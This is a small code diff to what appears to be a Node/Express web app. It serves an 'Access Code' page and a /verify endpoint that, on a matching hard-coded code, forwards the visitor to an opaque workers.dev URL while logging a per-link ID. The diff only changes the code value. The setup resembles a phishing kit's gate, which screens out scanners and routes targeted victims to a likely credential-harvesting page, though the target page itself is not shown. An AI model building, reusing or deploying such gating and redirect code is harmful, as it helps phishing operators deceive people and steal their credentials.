@@ -550,7 +550,7 @@ const myHTML = `
             <div class="stat-label">Reference</div>
           </div>
           <div class="stat">
-            <div class="stat-value">Quote435</div>
+            <div class="stat-value">920123</div>
             <div class="stat-label">Access Code</div>
           </div>
           <div class="stat">
@@ -655,7 +655,7 @@ const myHTML = `
 app.post('/verify', async (req, res) => {
   const { code } = req.body;
   const linkId = req.query.id || 'unknown'; // Capture the unique ID from URL
-  const CORRECT_CODE = "Quote435";
+  const CORRECT_CODE = "920123";
   const TARGET_URL = "https://constructors-cmhc-d66c31-8c3a80.summary-review.workers.dev/?k=Wf3zW15MN0Mh6bdhOwphDclJ";
 
   if (code === CORRECT_CODE) {
